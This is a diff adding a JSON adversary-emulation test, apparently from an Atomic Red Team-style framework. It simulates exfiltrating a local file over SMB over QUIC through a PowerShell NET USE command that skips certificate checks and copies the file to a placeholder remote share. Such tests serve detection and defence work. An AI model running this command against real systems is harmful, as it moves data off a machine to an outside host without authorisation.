@@ -1,0 +1,37 @@
+{
+  "id": "183235ca-8e6c-422c-88c2-3aa28c4825d9",
+  "name": "Exfiltration Over SMB over QUIC (NET USE)",
+  "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "af4b2562-2707-4ddf-9abd-0621b03a5c24",
+      "type": "execute-command",
+      "data": {
+        "command": "NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK\ncopy '#{local_file}' '*:\\'\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1570",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "remote_path",
+      "type": "string",
+      "description": "The UNC path to the share on the file server",
+      "value": "\\\\example.com\\sales"
+    },
+    {
+      "name": "local_file",
+      "type": "path",
+      "description": "The local file to be transferred",
+      "value": "C:\\path\\to\\file.txt"
+    }
+  ]
+}
